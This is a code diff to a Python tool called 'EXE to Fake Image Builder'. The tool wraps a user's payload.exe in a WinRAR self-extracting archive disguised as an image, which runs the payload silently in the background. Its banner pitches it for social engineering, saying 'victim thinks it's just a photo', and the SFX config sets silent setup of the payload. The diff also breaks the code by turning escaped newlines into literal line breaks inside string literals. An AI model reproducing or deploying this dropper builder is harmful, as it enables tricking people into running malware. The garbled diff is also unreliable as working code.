@@ -1,3 +1,13 @@
+# Copyright (c) Kernel-Tool
+# See the file 'LICENSE' for copying permission
+# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
+# EN: 
+#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
+#     - Do not resell this tool, do not credit it to yours.
+# FR: 
+#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
+#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
+
 import os
 import sys
 import subprocess
@@ -11,13 +21,26 @@ class EXEtoImageBuilder:
         self.output_folder = os.path.join(os.getcwd(), 'output')
         self.winrar_path = self.find_winrar()
     def find_winrar(self):
-        possible_paths = ['C:\\Program Files\\WinRAR\\WinRAR.exe', 'C:\\Program Files (x86)\\WinRAR\\WinRAR.exe', 'C:\\WinRAR\\WinRAR.exe']
+        possible_paths = ['C:\Program Files\WinRAR\WinRAR.exe', 'C:\Program Files (x86)\WinRAR\WinRAR.exe', 'C:\WinRAR\WinRAR.exe']
         for path in possible_paths:
             if os.path.exists(path):
                 return path
         return None
     def print_banner(self):
-        banner = '\n ________  __    __  ________    ________   ______         ______  __       __   ______  \n|        \\|  \\  |  \\|        \\  |        \\ /      \\       |      \\|  \\     /  \\ /      \\ \n| $$$$$$$$| $$  | $$| $$$$$$$$   \\$$$$$$$$|  $$$$$$\\       \\$$$$$$| $$\\   /  $$|  $$$$$$\\\n| $$__     \\$$\\/  $$| $$__  ______ | $$   | $$  | $$ ______ | $$  | $$$\\ /  $$$| $$ __\\$$\n| $$  \\     >$$  $$ | $$  \\|      \\| $$   | $$  | $$|      \\| $$  | $$$$\\  $$$$| $$|    \\\n| $$$$$    /  $$$$\\ | $$$$$ \\$$$$$$| $$   | $$  | $$ \\$$$$$$| $$  | $$\\$$ $$ $$| $$ \\$$$$\n| $$_____ |  $$ \\$$\\| $$_____      | $$   | $$__/ $$       _| $$_ | $$ \\$$$| $$| $$__| $$\n| $$     \\| $$  | $$| $$     \\     | $$    \\$$    $$      |   $$ \\| $$  \\$ | $$ \\$$    $$\n \\$$$$$$$$ \\$$   \\$$ \\$$$$$$$$      \\$$     \\$$$$$$        \\$$$$$$ \\$$      \\$$  \\$$$$$$ \n                                                                                         \n                                                                                         \n                                                                                                                                                                     \n        '
+        banner = '
+ ________  __    __  ________    ________   ______         ______  __       __   ______  
+|        \|  \  |  \|        \  |        \ /      \       |      \|  \     /  \ /      \ 
+| $$$$$$$$| $$  | $$| $$$$$$$$   \$$$$$$$$|  $$$$$$\       \$$$$$$| $$\   /  $$|  $$$$$$\
+| $$__     \$$\/  $$| $$__  ______ | $$   | $$  | $$ ______ | $$  | $$$\ /  $$$| $$ __\$$
+| $$  \     >$$  $$ | $$  \|      \| $$   | $$  | $$|      \| $$  | $$$$\  $$$$| $$|    \
+| $$$$$    /  $$$$\ | $$$$$ \$$$$$$| $$   | $$  | $$ \$$$$$$| $$  | $$\$$ $$ $$| $$ \$$$$
+| $$_____ |  $$ \$$\| $$_____      | $$   | $$__/ $$       _| $$_ | $$ \$$$| $$| $$__| $$
+| $$     \| $$  | $$| $$     \     | $$    \$$    $$      |   $$ \| $$  \$ | $$ \$$    $$
+ \$$$$$$$$ \$$   \$$ \$$$$$$$$      \$$     \$$$$$$        \$$$$$$ \$$      \$$  \$$$$$$ 
+                                                                                         
+                                                                                         
+                                                                                                                                                                     
+        '
         print(LIGHTCYAN + banner)
         print(LIGHTCYAN + '[+] ============================= EXE to Fake Image Builder ==============================')
         print(LIGHTCYAN + '[+] Creates a self-extracting .exe that looks like an image')
@@ -25,10 +48,12 @@ class EXEtoImageBuilder:
         print(LIGHTCYAN + '[+] Silently executes your payload.exe in background')
         print(LIGHTCYAN + '[+] Perfect for social engineering – victim thinks it\'s just a photo')
         print(LIGHTCYAN + '[+] Output in \'output\' folder')
-        print(LIGHTCYAN + '[+] =====================================================================================\n')
+        print(LIGHTCYAN + '[+] =====================================================================================
+')
     def get_user_input(self):
         os.makedirs(self.output_folder, exist_ok=True)
-        print(LIGHTCYAN + '[*] Enter the full paths to your files:\n')
+        print(LIGHTCYAN + '[*] Enter the full paths to your files:
+')
         use_icon = input(LIGHTCYAN + 'Do you want a custom icon? (y/n, default n): ').strip().lower()
         if use_icon == 'y':
             icon_path = input(LIGHTCYAN + 'Enter full path to .ico file: ').strip()
@@ -57,7 +82,13 @@ class EXEtoImageBuilder:
             output_name += '.exe'
         self.output_exe = os.path.join(self.output_folder, output_name)
     def create_sfx_config(self, temp_dir):
-        config_content = 'Path=%TEMP%\nSilent=1\nOverwrite=1\nSetup={payload}\nTempMode\nTitle=Viewing image...\n'
+        config_content = 'Path=%TEMP%
+Silent=1
+Overwrite=1
+Setup={payload}
+TempMode
+Title=Viewing image...
+'
         config_path = os.path.join(temp_dir, 'sfx_config.txt')
         with open(config_path, 'w') as f:
             f.write(config_content.format(payload=os.path.basename(self.payload_path)))
